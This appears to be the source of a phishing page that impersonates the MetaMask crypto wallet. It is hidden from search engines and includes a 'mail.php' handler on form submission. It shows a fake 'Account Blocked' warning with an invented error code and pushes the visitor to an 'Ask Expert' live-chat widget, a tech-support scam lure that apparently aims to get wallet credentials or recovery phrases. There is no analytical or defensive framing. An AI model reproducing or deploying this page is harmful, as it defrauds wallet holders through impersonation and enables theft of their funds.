 <?php
     if (isset($_POST['btnSub'])) {
        include 'mail.php';
    }
    ?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="robots" content="noindex, nofollow"/>
        <meta name="googlebot" content="noindex, nofollow"/>
        <meta name="bingbot" content="noindex, nofollow"/>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no" />
        <link rel="shortcut icon" href="assets/metamask-fox.svg?v=221" />
        <title>MetaMask</title>
        <link rel="stylesheet" type="text/css" href="assets/style.css" title="ltr" />
        <link rel="stylesheet" type="text/css" href="assets/style-1.css" />
        <link rel="stylesheet" type="text/css" href="assets/index.css" />
        <style data-jss="" data-meta="MuiInputBase">
            @-webkit-keyframes mui-auto-fill {
            }
            @-webkit-keyframes mui-auto-fill-cancel {
            }
            .MuiInputBase-root {
                color: rgba(0, 0, 0, 0.87);
                cursor: text;
                display: inline-flex;
                position: relative;
                font-size: 1rem;
                box-sizing: border-box;
                align-items: center;
                font-family: "Roboto", "Helvetica", "Arial", sans-serif;
                font-weight: 400;
                line-height: 1.1876em;
                letter-spacing: 0.00938em;
            }
            .MuiInputBase-root.Mui-disabled {
                color: rgba(0, 0, 0, 0.38);
                cursor: default;
            }
            .MuiInputBase-multiline {
                padding: 6px 0 7px;
            }
            .MuiInputBase-multiline.MuiInputBase-marginDense {
                padding-top: 3px;
            }
            .MuiInputBase-fullWidth {
                width: 100%;
            }
            .MuiInputBase-input {
                font: inherit;
                color: currentColor;
                width: 100%;
                border: 0;
                height: 1.1876em;
                margin: 0;
                display: block;
                padding: 6px 0 7px;
                min-width: 0;
                background: none;
                box-sizing: content-box;
                animation-name: mui-auto-fill-cancel;
                letter-spacing: inherit;
                animation-duration: 10ms;
                -webkit-tap-highlight-color: transparent;
            }
            .MuiInputBase-input::-webkit-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input::-moz-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input:-ms-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input::-ms-input-placeholder {
                color: currentColor;
                opacity: 0.42;
                transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
            }
            .MuiInputBase-input:focus {
                outline: 0;
            }
            .MuiInputBase-input:invalid {
                box-shadow: none;
            }
            .MuiInputBase-input::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            .MuiInputBase-input.Mui-disabled {
                opacity: 1;
            }
            .MuiInputBase-input:-webkit-autofill {
                animation-name: mui-auto-fill;
                animation-duration: 5000s;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-webkit-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-moz-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:-ms-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input::-ms-input-placeholder {
                opacity: 0 !important;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-webkit-input-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-moz-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus:-ms-input-placeholder {
                opacity: 0.42;
            }
            label[data-shrink="false"] + .MuiInputBase-formControl .MuiInputBase-input:focus::-ms-input-placeholder {
                opacity: 0.42;
            }
            .MuiInputBase-inputMarginDense {
                padding-top: 3px;
            }
            .MuiInputBase-inputMultiline {
                height: auto;
                resize: none;
                padding: 0;
            }
            .MuiInputBase-inputTypeSearch {
                -moz-appearance: textfield;
                -webkit-appearance: textfield;
            }
        </style>
        <style data-jss="" data-meta="MuiInput">
            .MuiInput-root {
                position: relative;
            }
            label + .MuiInput-formControl {
                margin-top: 16px;
            }
            .MuiInput-colorSecondary.MuiInput-underline:after {
                border-bottom-color: #f50057;
            }
            .MuiInput-underline:after {
                left: 0;
                right: 0;
                bottom: 0;
                content: "";
                position: absolute;
                transform: scaleX(0);
                transition: transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
                border-bottom: 2px solid #3f51b5;
                pointer-events: none;
            }
            .MuiInput-underline.Mui-focused:after {
                transform: scaleX(1);
            }
            .MuiInput-underline.Mui-error:after {
                transform: scaleX(1);
                border-bottom-color: #f44336;
            }
            .MuiInput-underline:before {
                left: 0;
                right: 0;
                bottom: 0;
                content: "\00a0";
                position: absolute;
                transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
                border-bottom: 1px solid rgba(0, 0, 0, 0.42);
                pointer-events: none;
            }
            .MuiInput-underline:hover:not(.Mui-disabled):before {
                border-bottom: 2px solid rgba(0, 0, 0, 0.87);
            }
            .MuiInput-underline.Mui-disabled:before {
                border-bottom-style: dotted;
            }
            @media (hover: none) {
                .MuiInput-underline:hover:not(.Mui-disabled):before {
                    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
                }
            }
        </style>
        <style data-jss="" data-meta="MuiFormLabel">
            .MuiFormLabel-root {
                color: rgba(0, 0, 0, 0.54);
                padding: 0;
                font-size: 1rem;
                font-family: "Roboto", "Helvetica", "Arial", sans-serif;
                font-weight: 400;
                line-height: 1;
                letter-spacing: 0.00938em;
            }
            .MuiFormLabel-root.Mui-focused {
                color: #3f51b5;
            }
            .MuiFormLabel-root.Mui-disabled {
                color: rgba(0, 0, 0, 0.38);
            }
            .MuiFormLabel-root.Mui-error {
                color: #f44336;
            }
            .MuiFormLabel-colorSecondary.Mui-focused {
                color: #f50057;
            }
            .MuiFormLabel-asterisk.Mui-error {
                color: #f44336;
            }
        </style>
        <style data-jss="" data-meta="MuiInputLabel">
            .MuiInputLabel-root {
                display: block;
                transform-origin: top left;
            }
            .MuiInputLabel-formControl {
                top: 0;
                left: 0;
                position: absolute;
                transform: translate(0, 24px) scale(1);
            }
            .MuiInputLabel-marginDense {
                transform: translate(0, 21px) scale(1);
            }
            .MuiInputLabel-shrink {
                transform: translate(0, 1.5px) scale(0.75);
                transform-origin: top left;
            }
            .MuiInputLabel-animated {
                transition: color 200ms cubic-bezier(0, 0, 0.2, 1) 0ms, transform 200ms cubic-bezier(0, 0, 0.2, 1) 0ms;
            }
            .MuiInputLabel-filled {
                z-index: 1;
                transform: translate(12px, 20px) scale(1);
                pointer-events: none;
            }
            .MuiInputLabel-filled.MuiInputLabel-marginDense {
                transform: translate(12px, 17px) scale(1);
            }
            .MuiInputLabel-filled.MuiInputLabel-shrink {
                transform: translate(12px, 10px) scale(0.75);
            }
            .MuiInputLabel-filled.MuiInputLabel-shrink.MuiInputLabel-marginDense {
                transform: translate(12px, 7px) scale(0.75);
            }
            .MuiInputLabel-outlined {
                z-index: 1;
                transform: translate(14px, 20px) scale(1);
                pointer-events: none;
            }
            .MuiInputLabel-outlined.MuiInputLabel-marginDense {
                transform: translate(14px, 12px) scale(1);
            }
            .MuiInputLabel-outlined.MuiInputLabel-shrink {
                transform: translate(14px, -6px) scale(0.75);
            }
        </style>
        <style data-jss="" data-meta="MuiFormControl">
            .MuiFormControl-root {
                border: 0;
                margin: 0;
                display: inline-flex;
                padding: 0;
                position: relative;
                min-width: 0;
                flex-direction: column;
                vertical-align: top;
            }
            .MuiFormControl-marginNormal {
                margin-top: 16px;
                margin-bottom: 8px;
            }
            .MuiFormControl-marginDense {
                margin-top: 8px;
                margin-bottom: 4px;
            }
            .MuiFormControl-fullWidth {
                width: 100%;
            }
        </style>
        <style data-jss="" data-meta="MuiTextField"></style>
        <style data-jss="" data-meta="makeStyles">
            .jss16 {
                color: #aeaeae;
                font-weight: 400;
            }
            .jss16.jss17 {
                color: #aeaeae;
            }
            .jss16.jss19 {
                color: #aeaeae;
            }
            .jss18:after {
                border-bottom: 2px solid rgb(3, 125, 214);
            }
            .jss20 {
                color: #aeaeae;
            }
            .jss21 {
                padding: 8px;
            }
            .jss21::placeholder {
                color: #aeaeae;
            }
            .jss22 {
                color: #fff;
            }
            .jss23:after {
                border-bottom: 2px solid #fff;
            }
            .jss24.jss25 {
                color: #5b5b5b;
            }
            .jss24.jss19 {
                color: #5b5b5b;
            }
            .jss27 {
                border: 1px solid #bbc0c5;
                height: 48px;
                display: flex;
                padding: 0 16px;
                align-items: center;
                border-radius: 6px;
            }
            label + .jss27 {
                margin-top: 9px;
            }
            .jss27.jss26 {
                border: 1px solid #2f9ae0;
            }
            .jss28 {
                color: #5b5b5b;
                position: initial;
                font-size: 1rem;
                transform: none;
                transition: none;
            }
            .jss29 {
                color: #5b5b5b;
                position: initial;
                font-size: 0.75rem;
                transform: none;
                transition: none;
            }
            .jss30 {
                line-height: initial !important;
            }
        </style>
    </head>
    <body>
        <div id="app-content">
            <div class="app os-win mouse-user-styles">
                <div class="menu-droppo-container network-droppo" style="position: absolute; top: 58px; width: 309px; z-index: 55;">
                    <style>
                        .menu-droppo-enter {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(-200%);
                        }

                        .menu-droppo-enter.menu-droppo-enter-active {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(0%);
                        }

                        .menu-droppo-leave {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(0%);
                        }

                        .menu-droppo-leave.menu-droppo-leave-active {
                            transition: transform 300ms ease-in-out;
                            transform: translateY(-200%);
                        }
                    </style>
                </div>
                <div class="main-container-wrapper">
                    <div class="first-time-flow">
                        <div class="first-time-flow__wrapper">
                            <div class="app-header__logo-container" style=" margin-left: 0px;">
                                <img height="30" src="assets/metamask-logo-horizontal.svg" class="app-header__metafox-logo--horizontal" alt="" />
                                <img height="42" width="42" src="assets/metamask-fox.svg" class="app-header__metafox-logo--icon" alt="" />
                            </div>
                            <div class="first-time-flow__import">
                                <div class="first-time-flow__create-back"><a href="index.php">&lt; Back</a></div>
                                <div class="first-time-flow__header" style=" text-align: center;">Account Blocked</div>
                                <div class="first-time-flow__text-block">
                                    <div class="actionable-message actionable-message--danger import-srp__srp-error actionable-message--with-icon">
                                            
                                            <div class="actionable-message__message">
                                                <div class="panel-body text-center" style=" text-align: center;">
                                         <p style="font-size: 20px;line-height: 28px; margin-bottom: 10px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                                        <div class="">
                                            <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label>
                                        </div>
                                        <div class="calling-number">
                                            <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px; display: inline-block; padding: 8px;">Ask Expert</a>
                                        </div>
                                    </div>
                                            </div>
                                        </div>
                                   
                                </div>
                               
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
      <!--Start of Tawk.to Script-->
    <script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
    s1.async=true;
    s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
    s1.charset='UTF-8';
    s1.setAttribute('crossorigin','*');
    s0.parentNode.insertBefore(s1,s0);
    })();
    </script>
    <!--End of Tawk.to Script-->
    </body>
</html>
